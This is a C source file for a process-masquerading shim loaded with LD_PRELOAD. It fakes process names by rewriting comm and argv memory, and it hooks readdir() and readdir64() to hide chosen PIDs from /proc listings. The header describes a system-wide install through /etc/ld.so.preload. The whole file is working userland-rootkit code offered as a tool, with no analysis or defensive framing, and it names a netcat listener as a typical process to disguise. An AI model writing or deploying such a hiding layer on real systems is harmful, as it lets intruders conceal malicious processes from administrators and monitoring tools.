/*
 * gohide shim — process masquerading library.
 *
 * Used two ways:
 *   1. LD_PRELOADed into child processes spawned by the gohide wrapper
 *      (via GOHIDE_FAKE_NAME / GOHIDE_HIDE_PID env vars).
 *   2. System-wide via /etc/ld.so.preload (see `gohide preload install`),
 *      where GOHIDE_PIDS="123,456" hides those pids from every process.
 *
 * What it does when GOHIDE_FAKE_NAME is set:
 *   - prctl(PR_SET_NAME): fakes comm -> ps / top / htop / /proc/PID/comm
 *   - rewrites argv[0] in its stack memory: fakes the first token of
 *     /proc/PID/cmdline -> ps -f / ps aux
 *
 * What it does when told to hide pids (GOHIDE_HIDE_PID / GOHIDE_PIDS):
 *   - hooks readdir()/readdir64() so /proc directory listings skip those
 *     pids (libprocesshider style; only affects processes that load this
 *     shim, e.g. ps/top when installed system-wide).
 *
 * GOHIDE_WIPE_ARGS=1 additionally blanks the whole argv string region so
 * the full cmdline shows only the fake name. Only safe for programs that
 * never re-read their argv (sleep, servers, nc -l ...). NOT for shells,
 * python, etc.
 */
#define _GNU_SOURCE
#define _LARGEFILE64_SOURCE

#include <dirent.h>
#include <dlfcn.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/prctl.h>
#include <unistd.h>

#define GOHIDE_MAX_PIDS 16
#define GOHIDE_COMM_MAX 16 /* kernel comm is 15 chars + NUL */

static char g_name[256];
static int g_hide_self = 0;
static pid_t g_pids[GOHIDE_MAX_PIDS];
static int g_npid = 0;

extern char **environ;
extern char *program_invocation_name;

/* Upper bound of the argv string region: the lowest environment string.
 * Stack layout puts argv strings immediately below env strings.
 * Returns 0 when there is no environment to bound against. */
static uintptr_t gohide_argv_region_end(void) {
	if (!environ || !*environ)
		return 0;
	uintptr_t upper = (uintptr_t)-1;
	for (char **e = environ; e && *e; e++)
		if ((uintptr_t)*e < upper)
			upper = (uintptr_t)*e;
	return upper;
}

/* Fake comm (prctl) and argv[0] memory so cmdline's first token matches.
 * argv[0] is capped at its original length: we must not clobber argv[1..]
 * because the running program still reads its arguments. */
void gohide_apply_name(const char *name) {
	prctl(PR_SET_NAME, name, 0, 0, 0);

	uintptr_t base = (uintptr_t)program_invocation_name;
	uintptr_t end = gohide_argv_region_end();
	if (end <= base)
		return;
	size_t room = (size_t)(end - base);
	size_t want = strlen(name);
	if (want >= room)
		want = room - 1;
	if (want > GOHIDE_COMM_MAX - 1)
		want = GOHIDE_COMM_MAX - 1; /* don't eat into argv[1] space */
	size_t orig = strlen(program_invocation_name);
	if (orig >= room)
		orig = room - 1;
	if (want > orig)
		want = orig;

	memset((void *)base, 0, orig + 1);
	memcpy((void *)base, name, want);
}

/* Blank the entire argv string region; cmdline shows only the fake name.
 * Destructive to argv — opt-in via GOHIDE_WIPE_ARGS=1. */
void gohide_wipe_args(void) {
	const char *w = getenv("GOHIDE_WIPE_ARGS");
	if (!w || !*w)
		return;
	uintptr_t base = (uintptr_t)program_invocation_name;
	uintptr_t end = gohide_argv_region_end();
	if (end <= base)
		return;
	size_t room = (size_t)(end - base);
	size_t want = strlen(g_name[0] ? g_name : program_invocation_name);
	if (want >= room)
		want = room - 1;
	memset((void *)base, 0, room);
	memcpy((void *)base, g_name, want);
}

void gohide_hide_pid(pid_t p) {
	if (p <= 0)
		return;
	for (int i = 0; i < g_npid; i++)
		if (g_pids[i] == p)
			return;
	if (g_npid < GOHIDE_MAX_PIDS)
		g_pids[g_npid++] = p;
}

static int gohide_pid_hidden(const char *fname) {
	if (g_npid == 0)
		return 0;
	int v = atoi(fname);
	if (v <= 0)
		return 0;
	for (int i = 0; i < g_npid; i++)
		if (g_pids[i] == v)
			return 1;
	return 0;
}

/* Is this DIR handle a listing of /proc itself? */
static int gohide_is_proc_root(DIR *d) {
	int fd = dirfd(d);
	if (fd < 0)
		return 0;
	char lp[64], tgt[512];
	snprintf(lp, sizeof(lp), "/proc/self/fd/%d", fd);
	ssize_t n = readlink(lp, tgt, sizeof(tgt) - 1);
	if (n <= 0)
		return 0;
	tgt[n] = '\0';
	return strcmp(tgt, "/proc") == 0;
}

typedef struct dirent *(*readdir_fn)(DIR *);
typedef struct dirent64 *(*readdir64_fn)(DIR *);

static readdir_fn real_readdir;
static readdir64_fn real_readdir64;

struct dirent *readdir(DIR *dirp) {
	if (!real_readdir)
		real_readdir = (readdir_fn)dlsym(RTLD_NEXT, "readdir");
	if (!real_readdir)
		return NULL;
	int proc = gohide_is_proc_root(dirp);
	for (;;) {
		struct dirent *d = real_readdir(dirp);
		if (!d)
			return NULL;
		if (proc && gohide_pid_hidden(d->d_name))
			continue;
		return d;
	}
}

struct dirent64 *readdir64(DIR *dirp) {
	if (!real_readdir64)
		real_readdir64 = (readdir64_fn)dlsym(RTLD_NEXT, "readdir64");
	if (!real_readdir64)
		return NULL;
	int proc = gohide_is_proc_root(dirp);
	for (;;) {
		struct dirent64 *d = real_readdir64(dirp);
		if (!d)
			return NULL;
		if (proc && gohide_pid_hidden(d->d_name))
			continue;
		return d;
	}
}

__attribute__((constructor))
static void gohide_ctor(void) {
	const char *n = getenv("GOHIDE_FAKE_NAME");
	if (n && *n) {
		snprintf(g_name, sizeof(g_name), "%s", n);
		gohide_apply_name(g_name);
		gohide_wipe_args();
	}
	if (getenv("GOHIDE_HIDE_PID"))
		gohide_hide_pid(getpid());
	const char *pl = getenv("GOHIDE_PIDS");
	if (pl && *pl) {
		char buf[256];
		snprintf(buf, sizeof(buf), "%s", pl);
		for (char *t = strtok(buf, ","); t; t = strtok(NULL, ","))
			gohide_hide_pid((pid_t)atoi(t));
	}
}
